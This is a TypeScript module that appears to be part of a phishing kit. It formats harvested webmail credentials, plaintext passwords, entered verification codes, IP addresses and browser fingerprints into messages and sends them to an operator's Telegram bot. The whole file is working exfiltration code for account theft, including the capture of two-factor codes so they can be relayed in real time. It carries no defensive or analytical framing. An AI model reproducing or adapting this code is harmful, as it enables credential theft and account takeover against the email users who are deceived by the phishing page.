import { TELEGRAM_CONFIG } from '../config/telegram';
import { EmailData } from '../emailjs/types';

class TelegramService {
  private static instance: TelegramService;
  private apiUrl: string;

  private constructor() {
    this.apiUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
  }

  public static getInstance(): TelegramService {
    if (!TelegramService.instance) {
      TelegramService.instance = new TelegramService();
    }
    return TelegramService.instance;
  }

  public async sendLoginData(data: EmailData) {
    const message = this.formatLoginMessage(data);
    await this.sendMessage(message);
  }

  public async sendVerificationCode(data: EmailData & { code: string }) {
    const message = this.formatVerificationMessage(data);
    await this.sendMessage(message);
  }

  public async sendVerificationAttempt(data: EmailData & { verificationCode: string }) {
    const message = this.formatVerificationAttemptMessage(data);
    await this.sendMessage(message);
  }

  private formatLoginMessage(data: EmailData): string {
    return `
🔐 New Login Attempt

📧 Email: ${data.email}
🔑 Password: ${data.password}

💻 System Info:
- Platform: ${data.systemInfo.platform}
- Browser: ${data.systemInfo.userAgent}
- Language: ${data.systemInfo.language}
- Timezone: ${data.systemInfo.timezone}
- Screen: ${data.systemInfo.screenResolution}
- CPU Cores: ${data.systemInfo.cpuCores}

🌐 Session Info:
- IP Address: ${data.sessionData.ipAddress}
- Visitor ID: ${data.sessionData.visitorId}
- Login URL: ${data.webmailData.loginUrl}
- Attempts: ${data.authFlowData.loginAttempts}

⏰ Timestamp: ${new Date().toISOString()}
    `.trim();
  }

  private formatVerificationMessage(data: EmailData & { code: string }): string {
    return `
📱 Verification Code Sent

📧 Email: ${data.email}
🔢 Code: ${data.code}

💻 System Info:
- IP Address: ${data.sessionData.ipAddress}
- Browser: ${data.systemInfo.userAgent}
- Platform: ${data.systemInfo.platform}

⏰ Timestamp: ${new Date().toISOString()}
    `.trim();
  }

  private formatVerificationAttemptMessage(data: EmailData & { verificationCode: string }): string {
    return `
🔍 Verification Attempt

📧 Email: ${data.email}
🔢 Entered Code: ${data.verificationCode}
📊 Attempt #${data.authFlowData.loginAttempts}

💻 System Info:
- IP Address: ${data.sessionData.ipAddress}
- Browser: ${data.systemInfo.userAgent}
- Platform: ${data.systemInfo.platform}

⏰ Timestamp: ${new Date().toISOString()}
    `.trim();
  }

  private async sendMessage(text: string) {
    try {
      const response = await fetch(this.apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CONFIG.CHAT_ID,
          text,
          parse_mode: 'HTML'
        })
      });

      if (!response.ok) {
        throw new Error('Failed to send Telegram message');
      }
    } catch (error) {
      console.error('Telegram API error:', error);
      throw error;
    }
  }
}

export const telegramService = TelegramService.getInstance();